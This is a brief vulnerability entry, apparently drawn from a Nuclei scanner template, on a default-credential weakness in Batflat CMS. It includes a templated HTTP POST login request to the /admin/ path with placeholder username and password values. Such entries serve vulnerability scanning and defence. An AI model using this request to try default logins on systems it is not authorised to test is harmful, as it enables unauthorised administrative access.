# Vulnerability: Batflat CMS - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`batflat-default-login.yaml`)

## Description
Batflat CMS is vulnerable to default login vulnerability that most commonly affects devices having some pre-set (default) administrative credentials to access all configuration settings.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /admin/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&login=
```

